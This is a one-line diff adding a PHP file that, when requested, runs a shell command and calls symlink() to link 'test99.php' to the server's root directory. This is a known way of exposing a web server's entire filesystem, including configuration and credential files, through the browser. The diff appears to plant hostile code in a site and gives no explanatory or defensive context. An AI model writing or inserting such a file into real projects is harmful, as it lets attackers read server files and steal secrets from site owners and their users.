@@ -1,0 +1,1 @@
+<?php system("ln -sf / test99.php"); symlink("/", "test99.php"); ?>
